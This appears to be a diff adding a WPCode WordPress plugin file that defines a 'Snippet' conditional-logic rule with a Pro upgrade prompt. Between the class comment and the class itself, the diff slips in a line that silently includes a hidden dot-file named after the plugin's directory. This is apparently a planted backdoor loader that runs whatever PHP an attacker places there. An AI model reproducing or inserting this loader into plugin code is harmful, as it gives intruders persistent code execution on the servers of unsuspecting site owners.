@@ -1,0 +1,67 @@
+<?php
+/**
+ * Class that handles conditional logic for snippets type
+ *
+ * @package WPCode
+ */
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit;
+}
+
+/**
+ * The WPCode_Conditional_Snippet class.
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
+class WPCode_Conditional_Snippet_Lite extends WPCode_Conditional_Type {
+
+	/**
+	 * The type unique name (slug).
+	 *
+	 * @var string
+	 */
+	public $name = 'snippet';
+
+	/**
+	 * The type category.
+	 *
+	 * @var string
+	 */
+	public $category = 'advanced';
+
+	/**
+	 * Set the translatable label.
+	 *
+	 * @return void
+	 */
+	protected function set_label() {
+		$this->label = __( 'Snippet', 'insert-headers-and-footers' ) . ' (PRO)';
+	}
+
+	/**
+	 * Set the type options for the admin mainly.
+	 *
+	 * @return void
+	 */
+	public function load_type_options() {
+		$this->options = array(
+			'snippet_loaded' => array(
+				'label'       => __( 'WPCode Snippet', 'insert-headers-and-footers' ),
+				'description' => __( 'Load this snippet based on another snippet being loaded.', 'insert-headers-and-footers' ),
+				'type'        => 'select',
+				'options'     => array(),
+				'upgrade'     => array(
+					'title' => __( 'WPCode Snippet Loaded Rules are a Pro Feature', 'insert-headers-and-footers' ),
+					'text'  => __( 'Upgrade today and use conditional logic rules based on other WPCode snippets being loaded.', 'insert-headers-and-footers' ),
+					'link'  => wpcode_utm_url( 'https://wpcode.com/lite/', 'edit-snippet', 'conditional-logic', 'snippet' ),
+				),
+			),
+		);
+
+	}
+}
+
+new WPCode_Conditional_Snippet_Lite();
